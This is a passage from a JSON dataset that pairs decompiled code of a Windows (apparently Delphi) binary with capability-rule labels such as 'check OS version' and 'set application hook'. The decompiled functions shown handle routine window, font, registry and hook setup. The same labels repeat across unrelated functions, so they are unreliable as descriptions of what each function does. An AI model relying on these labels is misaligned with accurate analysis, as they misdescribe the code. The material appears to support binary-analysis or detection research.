        "decompiled_code": "\nvoid fcn.00443f94(void)\n\n{\n    uchar *puVar1;\n    char cVar2;\n    int32_t in_EAX;\n    uint uVar3;\n    int32_t iVar4;\n    uint *in_FS_OFFSET;\n    uint uStack672;\n    uint uStack668;\n    uchar *puStack664;\n    uint uStack656;\n    uint uStack636;\n    uint uStack628;\n    uint uStack624;\n    uchar *puStack620;\n    uint var_260h;\n    uint var_25ch;\n    uint var_258h;\n    uint var_254h;\n    uint var_214h;\n    uint lpList;\n    int32_t *var_14h;\n    int32_t var_10h;\n    uint hKey;\n    uint var_8h;\n    int32_t var_4h;\n    \n    puStack620 = &stack0xfffffffc;\n    uStack624 = 0x44413f;\n    uStack628 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffd8c;\n    puVar1 = &stack0xfffffffc;\n    if (*(in_EAX + 0x34) == 0) {\n        var_4h = in_EAX;\n        uVar3 = fcn.00404620();\n        *(var_4h + 0x34) = uVar3;\n        fcn.00405530();\n        uStack636 = 0x40;\n        iVar4 = sub.user32.dll_GetKeyboardLayoutList();\n        if (-1 < iVar4 + -1) {\n            var_14h = &fcn.00443f94::lpList;\n            var_10h = iVar4;\n            do {\n                cVar2 = fcn.0045d9e0();\n                if (cVar2 != '\\0') {\n                    uStack656 = 0x44404c;\n                    uStack656 = fcn.0040af20(0);\n                    uStack636 = 0x80000002;\n                    puStack664 = 0x444057;\n                    iVar4 = sub.advapi32.dll_RegOpenKeyExA_1();\n                    if (iVar4 == 0) {\n                        uStack668 = 0x4440fb;\n                        uStack672 = *in_FS_OFFSET;\n                        *in_FS_OFFSET = &stack0xfffffd60;\n                        var_8h = 0x100;\n                        uVar3 = hKey;\n                        puStack664 = &stack0xfffffffc;\n                        iVar4 = sub.advapi32.dll_RegQueryValueExA_1\n                                          (hKey, 0x444188, 0, 0, &fcn.00443f94::var_214h, &fcn.00443f94::var_8h);\n                        if (iVar4 == 0) {\n                            fcn.004057a0();\n                            (**(**(var_4h + 0x34) + 0x3c))();\n                            if (*var_14h == *(var_4h + 0x3c)) {\n                                fcn.004057a0();\n                            }\n                        }\n                        *in_FS_OFFSET = uVar3;\n                        sub.advapi32.dll_RegCloseKey_1(hKey, 0x444102);\n                        return;\n                    }\n                }\n                var_14h = var_14h + 1;\n                var_10h = var_10h + -1;\n            } while (var_10h != 0);\n        }\n        *(*(var_4h + 0x34) + 0x25) = 0;\n        fcn.0041b60c();\n        puVar1 = puStack620;\n    }\n    puStack620 = puVar1;\n    *in_FS_OFFSET = uStack636;\n    uStack628 = 0x444146;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 838
    },
    "004442e0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.004442e0(void)\n\n{\n    uchar *puVar1;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    uint *puStack464;\n    int32_t iStack424;\n    uint uStack420;\n    uchar *puStack416;\n    uint var_191h;\n    uint var_f1h;\n    uint var_b5h;\n    uint pvParam;\n    uint var_1h;\n    \n    puStack416 = &var_1h + 1;\n    var_1h._0_1_ = 0;\n    if (*0x49ac1c != 0) {\n        var_1h._0_1_ = *(*0x49ac1c + 0x88);\n    }\n    uStack420 = 0x444427;\n    iStack424 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &iStack424;\n    puVar1 = &var_1h + 1;\n    if (*0x49ac1c != 0) {\n        fcn.00446d38();\n        puVar1 = puStack416;\n    }\n    puStack416 = puVar1;\n    iVar2 = sub.user32.dll_SystemParametersInfoA(0x1f, 0x3c, &pvParam, 0);\n    if (iVar2 == 0) {\n        sub.gdi32.dll_GetStockObject(0xd);\n        fcn.00424924();\n    }\n    else {\n        sub.gdi32.dll_CreateFontIndirectA(&pvParam);\n        fcn.00424924();\n    }\n    var_191h = 0x154;\n    iVar2 = sub.user32.dll_SystemParametersInfoA(0x29, 0, &var_191h, 0);\n    if (iVar2 == 0) {\n        fcn.00424a08();\n        puStack464 = 0xd;\n        sub.gdi32.dll_GetStockObject();\n        fcn.00424924();\n    }\n    else {\n        puStack464 = &var_b5h;\n        sub.gdi32.dll_CreateFontIndirectA();\n        fcn.00424924();\n        sub.gdi32.dll_CreateFontIndirectA(&var_f1h);\n        fcn.00424924();\n    }\n    fcn.004246a8();\n    fcn.004246a8();\n    *in_FS_OFFSET = puStack464;\n    if (*0x49ac1c != 0) {\n        fcn.00446d38(0x44442e);\n    }\n    return;\n}\n",
        "token_count": 584
    },
    "0044443c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0044443c(void)\n\n{\n    int32_t in_EAX;\n    \n    *(in_EAX + 0x8c) = *(in_EAX + 0x8c) + -1;\n    if ((*(in_EAX + 0x8c) == 0) && ((*(in_EAX + 0x8e) & 0x10) != 0)) {\n        fcn.0044445c();\n    }\n    return;\n}\n",
        "token_count": 106
    },
    "004444ec": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid __cdecl fcn.004444ec(int32_t arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t *in_EAX;\n    char in_DL;\n    int32_t iVar3;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_1h;\n    \n    iVar3 = *(*(arg_8h + -4) + 8) - **(arg_8h + -4);\n    if ((iVar3 < 0) || (in_DL - 3U < 2)) {\n        iVar3 = in_EAX[0x12];\n    }\n    var_10h = *(*(arg_8h + -4) + 0xc) - *(*(arg_8h + -4) + 4);\n    if ((var_10h < 0) || (in_DL - 1U < 2)) {\n        var_10h = in_EAX[0x13];\n    }\n    if ((in_DL == '\\x01') && (*(in_EAX + 0x273) == '\\x02')) {\n        var_8h = fcn.0043df38();\n        var_ch = fcn.0043df58();\n        iVar3 = (***0x495974)(0x3d);\n    }\n    else {\n        var_8h = **(arg_8h + -4);\n        var_ch = *(*(arg_8h + -4) + 4);\n    }\n    if (in_DL == '\\x01') {\n        piVar1 = *(arg_8h + -4) + 4;\n        *piVar1 = *piVar1 + var_10h;\n    }\n    else if (in_DL == '\\x02') {\n        piVar1 = *(arg_8h + -4) + 0xc;\n        *piVar1 = *piVar1 - var_10h;\n        var_ch = *(*(arg_8h + -4) + 0xc);\n    }\n    else if (in_DL == '\\x03') {\n        **(arg_8h + -4) = **(arg_8h + -4) + iVar3;\n    }\n    else if (in_DL == '\\x04') {\n        piVar1 = *(arg_8h + -4) + 8;\n        *piVar1 = *piVar1 - iVar3;\n        var_8h = *(*(arg_8h + -4) + 8);\n    }\n    (**(*in_EAX + 0x88))(var_10h, iVar3);\n    if (*(in_EAX + 0x273) == '\\x02') {\n        iVar3 = iVar3 - var_8h;\n        var_10h = var_10h - var_ch;\n    }\n    iVar2 = in_EAX[0x12];\n    if ((iVar3 != iVar2) || (in_EAX[0x13] != var_10h)) {\n    // switch table (6 cases) at 0x444632\n        switch(in_DL) {\n        case '\\x01':\n            piVar1 = *(arg_8h + -4) + 4;\n            *piVar1 = *piVar1 - (var_10h - in_EAX[0x13]);\n            break;\n        case '\\x02':\n            piVar1 = *(arg_8h + -4) + 0xc;\n            *piVar1 = *piVar1 + (var_10h - in_EAX[0x13]);\n            break;\n        case '\\x03':\n            **(arg_8h + -4) = **(arg_8h + -4) - (iVar3 - iVar2);\n            break;\n        case '\\x04':\n            piVar1 = *(arg_8h + -4) + 8;\n            *piVar1 = *piVar1 + (iVar3 - iVar2);\n            break;\n        case '\\x05':\n            piVar1 = *(arg_8h + -4) + 8;\n            *piVar1 = *piVar1 + (iVar3 - iVar2);\n            piVar1 = *(arg_8h + -4) + 0xc;\n            *piVar1 = *piVar1 + (var_10h - in_EAX[0x13]);\n        }\n    }\n    return;\n}\n",
        "token_count": 985
    },
    "004446a8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid __cdecl fcn.004446a8(int32_t arg_8h)\n\n{\n    char in_AL;\n    char cVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint var_8h;\n    uint var_1h;\n    \n    (**(**(arg_8h + -8) + 8))();\n    if ((((*(arg_8h + -0xc) != 0) && (*(*(arg_8h + -0xc) + 0x30) == 0)) && ((*(*(arg_8h + -0xc) + 0x1c) & 0x10) == 0))\n       && (((*(*(arg_8h + -0xc) + 0x57) != '\\0' && (*(*(arg_8h + -0xc) + 0x5b) == in_AL)) &&\n           (*(*(arg_8h + -0xc) + 0x273) != '\\x01')))) {\n        fcn.0041975c();\n    }\n    iVar2 = fcn.00443dbc();\n    if (-1 < iVar2 + -1) {\n        do {\n            iVar3 = fcn.00443da8();\n            if (((*(iVar3 + 0x30) == 0) && (*(iVar3 + 0x5b) == in_AL)) &&\n               (((*(iVar3 + 0x1c) & 0x10) == 0 &&\n                (((*(iVar3 + 0x57) != '\\0' && (*(iVar3 + 0x273) != '\\x01')) && (iVar3 != *(arg_8h + -0xc))))))) {\n                for (iVar3 = 0; iVar3 < *(*(arg_8h + -8) + 8); iVar3 = iVar3 + 1) {\n                    fcn.004198b4();\n                    cVar1 = fcn.00444464();\n                    if (cVar1 != '\\0') break;\n                }\n                fcn.00419930();\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    iVar2 = *(*(arg_8h + -8) + 8);\n    if (-1 < iVar2 + -1) {\n        do {\n            iVar3 = arg_8h;\n            fcn.004198b4();\n            fcn.004444ec(iVar3);\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    return;\n}\n",
        "token_count": 575
    },
    "004447f8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004447f8(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar1 = fcn.00443dbc();\n    iVar1 = iVar1 + -1;\n    if (-1 < iVar1) {\n        do {\n            iVar2 = fcn.00443da8();\n            if ((((*(iVar2 + 0x30) == 0) && ((*(iVar2 + 0x1c) & 0x10) == 0)) && (*(iVar2 + 0x5b) != '\\0')) &&\n               ((*(iVar2 + 0x57) != '\\0' && (*(iVar2 + 0x273) != '\\x01')))) {\n                return 1;\n            }\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != -1);\n    }\n    return 0;\n}\n",
        "token_count": 199
    },
    "004448d8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004448d8(void)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uVar1;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_14h;\n    int32_t var_4h;\n    \n    if (*(in_EAX + 0x8c) != 0) {\n        *(in_EAX + 0x8e) = *(in_EAX + 0x8e) | 0x10;\n        return;\n    }\n    puStack32 = 0x444906;\n    var_4h = in_EAX;\n    fcn.00444434();\n    uStack36 = 0x444951;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    uVar1 = 0x30;\n    puStack32 = &stack0xfffffffc;\n    sub.user32.dll_SystemParametersInfoA(0x30, 0, &fcn.004448d8::var_14h, 0);\n    fcn.00444850();\n    *in_FS_OFFSET = uVar1;\n    *(var_4h + 0x8e) = *(var_4h + 0x8e) & 0xffef;\n    fcn.0044443c(0x444958);\n    return;\n}\n",
        "token_count": 307
    },
    "0044496c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0044496c(void)\n\n{\n    int32_t in_EAX;\n    \n    if (in_EAX != 0) {\n        do {\n            if (*(in_EAX + 0x84) != 0) {\n                fcn.00405584();\n                return;\n            }\n            in_EAX = *(in_EAX + 0x30);\n        } while (in_EAX != 0);\n    }\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 105
    },
    "004449a4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004449a4(void)\n\n{\n    int32_t in_EAX;\n    \n    for (; (in_EAX != 0 && (*(in_EAX + 0x8d) == '\\0')); in_EAX = *(in_EAX + 0x30)) {\n    }\n    return;\n}\n",
        "token_count": 68
    },
    "004449c4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004449c4(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    \n    puStack20 = &stack0xfffffffc;\n    if (*0x49ac1c != 0) {\n        uStack24 = 0x4449f5;\n        uStack28 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &uStack28;\n        fcn.00447394();\n        *in_FS_OFFSET = uStack28;\n    }\n    return;\n}\n",
        "token_count": 122
    },
    "00444a18": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00444a18(void)\n\n{\n    int32_t iVar1;\n    uint var_8h;\n    \n    *0x49ac30 = sub.kernel32.dll_GetCurrentThreadId_1();\n    while( true ) {\n        iVar1 = sub.kernel32.dll_WaitForSingleObject();\n        if (iVar1 != 0x102) break;\n        if (*0x49ac1c != 0) {\n            if (*(*0x49ac1c + 0x60) != 0) {\n                sub.user32.dll_GetCursorPos();\n                iVar1 = fcn.0044ed74();\n                if (iVar1 == 0) {\n                    fcn.00447440();\n                }\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 164
    },
    "00444a74": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00444a74(int32_t arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint uVar1;\n    \n    uVar1 = sub.user32.dll_CallNextHookEx(*0x49ac38, arg_8h, arg_ch, arg_10h);\n    if ((-1 < arg_8h) && (*0x49ac1c != 0)) {\n        fcn.00446384();\n    }\n    return uVar1;\n}\n",
        "token_count": 111
    },
    "00444ab8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00444ab8(void)\n\n{\n    uint uStack20;\n    code *pcStack16;\n    uint uStack12;\n    uint uStack8;\n    \n    if (*(*0x49ac1c + 0xad) == '\\0') {\n        if (*0x49ac38 == 0) {\n            uStack8 = 0x444ad5;\n            uStack8 = sub.kernel32.dll_GetCurrentThreadId_1();\n            uStack12 = 0;\n            pcStack16 = fcn.00444a74;\n            uStack20 = 3;\n            *0x49ac38 = sub.user32.dll_SetWindowsHookExA();\n        }\n        if (*0x49ac34 == 0) {\n            *0x49ac34 = sub.kernel32.dll_CreateEventA(0, 0, 0, 0);\n        }\n        if (*0x49ac3c == 0) {\n            *0x49ac3c = sub.kernel32.dll_CreateThread_1(0, 1000, fcn.00444a18, 0, 0, &stack0xffffffec);\n        }\n    }\n    return;\n}\n",
        "token_count": 255
    },
    "00444b2c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "set application hook"
        ],
        "decompiled_code": "\nvoid fcn.00444b2c(void)\n\n{\n    int32_t iVar1;\n    \n    if (*0x49ac38 != 0) {\n        sub.user32.dll_UnhookWindowsHookEx(*0x49ac38);\n    }\n    *0x49ac38 = 0;\n    if (*0x49ac3c != 0) {\n        sub.kernel32.dll_SetEvent(*0x49ac34);\n        iVar1 = sub.kernel32.dll_GetCurrentThreadId_1();\n        if (iVar1 != *0x49ac30) {\n            sub.kernel32.dll_WaitForSingleObject(*0x49ac3c, 0xffffffff);\n        }\n        sub.kernel32.dll_CloseHandle_1(*0x49ac3c);\n        *0x49ac3c = 0;\n    }\n    return;\n}\n",
        "token_count": 179
    },
    "00444b88": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint64_t fcn.00444b88(void)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint auStack8 [2];\n    \n    auStack8[0] = 8;\n    uVar2 = 8;\n    uVar1 = sub.user32.dll_SystemParametersInfoA(0x48, 8, auStack8, 0);\n    if (uVar1 != 0) {\n        return CONCAT44(uVar2, uVar1 & 0xffffff00 | uVar2 != 0);\n    }\n    return uVar2 << 0x20;\n}\n",
        "token_count": 135
    },
    "00444cfc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\ncode * __fastcall fcn.00444cfc(uint param_1, char param_2)\n\n{\n    code **ppcVar1;\n    code *in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    uchar *puVar4;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uVar5;\n    uint lpFilename;\n    uint var_1h;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_2 = extraout_DL;\n    }\n    var_1h._0_1_ = param_2;\n    fcn.0041ff70();\n    ppcVar1 = *0x495a60;\n    if (*(*0x495a60 + 2) == 0) {\n        (*0x495a60)[1] = in_EAX;\n        *ppcVar1 = fcn.00446740;\n    }\n    ppcVar1 = *0x495b40;\n    if (*(*0x495b40 + 2) == 0) {\n        (*0x495b40)[1] = in_EAX;\n        *ppcVar1 = fcn.0044694c;\n    }\n    in_EAX[0x34] = 0x0;\n    uVar2 = fcn.00404620();\n    *(in_EAX + 0x90) = uVar2;\n    uVar2 = fcn.00404620();\n    *(in_EAX + 0x98) = uVar2;\n    uVar2 = fcn.00404620();\n    *(in_EAX + 0xb0) = uVar2;\n    *(in_EAX + 0x60) = 0;\n    *(in_EAX + 0x84) = 0;\n    *(in_EAX + 0x5c) = 0xff000018;\n    *(in_EAX + 0x78) = 500;\n    in_EAX[0x7c] = 0x1;\n    *(in_EAX + 0x80) = 0;\n    *(in_EAX + 0x74) = 0x9c4;\n    in_EAX[0x88] = 0x0;\n    in_EAX[0xa5] = 0x1;\n    in_EAX[0xbc] = 0x1;\n    uVar2 = fcn.0042ae74();\n    *(in_EAX + 0xa0) = uVar2;\n    sub.user32.dll_LoadIconA(**0x495954, 0x444f0c);\n    fcn.0042b248();\n    iVar3 = *(in_EAX + 0xa0);\n    *(iVar3 + 0x14) = in_EAX;\n    *(iVar3 + 0x10) = 0x447010;\n    sub.kernel32.dll_GetModuleFileNameA_1(**0x495954, &lpFilename, 0x100);\n    sub.user32.dll_OemToCharA(&lpFilename, &lpFilename);\n    iVar3 = fcn.0040ea40();\n    if (iVar3 != 0) {\n        fcn.0040a8c4();\n    }\n    puVar4 = fcn.0040ea74();\n    if (puVar4 != NULL) {\n        *puVar4 = 0;\n    }\n    uVar2 = sub.user32.dll_CharNextA_1(&lpFilename);\n    sub.user32.dll_CharLowerA(uVar2);\n    fcn.004057a0();\n    in_EAX[0xd4] = 0x0;\n    uVar5 = 0x446424;\n    uVar2 = fcn.004210ec(0x446424, in_EAX);\n    *(in_EAX + 200) = uVar2;\n    if (**0x4957e8 == '\\0') {\n        fcn.00445050();\n    }\n    in_EAX[0x59] = 0x1;\n    in_EAX[0x5a] = 0x1;\n    in_EAX[0x5b] = 0x1;\n    in_EAX[0xa6] = 0x1;\n    *(in_EAX + 0xa8) = 0;\n    fcn.004471e8();\n    fcn.00447d4c();\n    if (var_1h != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uVar5;\n    }\n    return in_EAX;\n}\n",
        "token_count": 1034
    },
    "00445050": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00445050(void)\n\n{\n    int16_t iVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint *in_FS_OFFSET;\n    uint in_stack_00000030;\n    uint in_stack_00000034;\n    uint uStack64;\n    uint uStack60;\n    uchar *puStack56;\n    uint var_2ch;\n    uint lpWndClass;\n    uint uStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    uint uStack16;\n    uint uStack12;\n    uint uStack8;\n    \n    puStack56 = &stack0xfffffffc;\n    uStack60 = 0x4451ec;\n    uStack64 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc0;\n    if ((*(in_EAX + 0xac) == '\\0') && (**0x495ba4 == '\\0')) {\n        uVar2 = fcn.00421030(fcn.00445868, in_EAX);\n        *(in_EAX + 0x40) = uVar2;\n        *0x493600 = sub.user32.dll_DefWindowProcA;\n        iVar3 = sub.user32.dll_GetClassInfoA(*0x4987f8, *0x493620, &fcn.00445050::lpWndClass);\n        if (iVar3 == 0) {\n            *0x49360c = *0x4987f8;\n            iVar1 = sub.user32.dll_RegisterClassA(0x4935fc);\n            if (iVar1 == 0) {\n                fcn.00407550();\n                fcn.0040db04();\n                fcn.00404ec4();\n            }\n        }\n        uVar4 = (***0x495974)(0, 0x84ca0000);\n        iVar3 = uVar4 >> 1;\n        if (iVar3 < 0) {\n            iVar3 = iVar3 + ((uVar4 & 1) != 0);\n        }\n        uVar4 = (***0x495974)(1, iVar3);\n        uVar2 = *0x4987f8;\n        iVar3 = uVar4 >> 1;\n        if (iVar3 < 0) {\n            iVar3 = iVar3 + ((uVar4 & 1) != 0);\n        }\n        fcn.004059dc();\n        uVar2 = fcn.00408584(0, uVar2, 0, 0, 0, 0, iVar3, in_stack_00000030, in_stack_00000034);\n        *(in_EAX + 0x30) = uVar2;\n        *(in_EAX + 0xac) = 1;\n        uStack20 = *(in_EAX + 0x30);\n        sub.user32.dll_SetWindowLongA();\n        if (**0x495a14 != '\\0') {\n            fcn.00445f10();\n            uStack8 = *(in_EAX + 0x30);\n            uStack12 = 0x445185;\n            sub.user32.dll_SendMessageA();\n            uStack12 = 0x44518c;\n            uStack12 = fcn.00445f10();\n            uStack16 = 0xfffffff2;\n            uStack20 = *(in_EAX + 0x30);\n            uStack24 = 0x445198;\n            sub.user32.dll_SetClassLongA();\n        }\n        uStack24 = 0;\n        uStack28 = *(in_EAX + 0x30);\n        uStack32 = 0x4451a3;\n        uVar2 = sub.user32.dll_GetSystemMenu();\n        uStack32 = 0;\n        uStack36 = 0xf030;\n        lpWndClass = 0x4451b2;\n        uStack40 = uVar2;\n        sub.user32.dll_DeleteMenu();\n        lpWndClass = 0;\n        puStack56 = 0x4451bf;\n        uStack64 = uVar2;\n        sub.user32.dll_DeleteMenu();\n        if (**0x495a14 != '\\0') {\n            puStack56 = NULL;\n            uStack60 = 0xf010;\n            uStack64 = uVar2;\n            sub.user32.dll_DeleteMenu();\n        }\n    }\n    *in_FS_OFFSET = uStack64;\n    puStack56 = 0x4451f3;\n    uStack60 = 0x4451eb;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 1017
    },
    "00445258": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00445258(int32_t arg_8h, int32_t *arg_ch)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    \n    uVar3 = 0xffffffff;\n    if (*0x49ac1c == 0) {\n        return 0xffffffff;\n    }\n    iVar1 = sub.user32.dll_GetWindow(arg_8h, 4);\n    if (iVar1 == *(*0x49ac1c + 0x30)) {\n        uVar2 = sub.user32.dll_GetWindowLongA(arg_8h, 0xffffffec);\n        if (((uVar2 & 8) == 0) ||\n           (((*(*0x49ac1c + 0x44) != 0 && (*(arg_ch + 1) == '\\0')) && (iVar1 = fcn.00458594(),  arg_8h == iVar1)))) {\n            *arg_ch = arg_8h;\n            uVar3 = 0;\n        }\n        else {\n            fcn.0041975c();\n        }\n        return uVar3;\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 257
    },
    "004452d0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004452d0(uint param_1, uchar param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    code *pcVar4;\n    int32_t iStack16;\n    uchar uStack12;\n    \n    iStack16 = *(in_EAX + 0x30);\n    if (iStack16 != 0) {\n        if (*(in_EAX + 0x94) == 0) {\n            pcVar4 = fcn.00445258;\n            uStack12 = param_2;\n            sub.user32.dll_EnumWindows(fcn.00445258, &iStack16);\n            if (*(*(in_EAX + 0x90) + 8) != 0) {\n                uVar1 = sub.user32.dll_GetWindow(pcVar4, 3);\n                uVar2 = sub.user32.dll_GetWindowLongA(uVar1, 0xffffffec, uVar1);\n                if ((uVar2 & 8) != 0) {\n                    uVar1 = 0xfffffffe;\n                }\n                iVar3 = *(*(in_EAX + 0x90) + 8) + -1;\n                if (-1 < iVar3) {\n                    do {\n                        uVar1 = fcn.004198b4(uVar1, 0, 0, 0, 0, 0x213);\n                        sub.user32.dll_SetWindowPos();\n                        iVar3 = iVar3 + -1;\n                    } while (iVar3 != -1);\n                }\n            }\n        }\n        *(in_EAX + 0x94) = *(in_EAX + 0x94) + 1;\n    }\n    return;\n}\n",
        "token_count": 385
    },
    "00445374": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00445374(void)\n\n{\n    int32_t in_EAX;\n    \n    *(in_EAX + 0xc4) = *(in_EAX + 0xc4) + 1;\n    if ((*(in_EAX + 0xc4) == 1) && (*(in_EAX + 0x10a) != 0)) {\n        (**(in_EAX + 0x108))();\n    }\n    return;\n}\n",
        "token_count": 99
    },
    "004453a0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
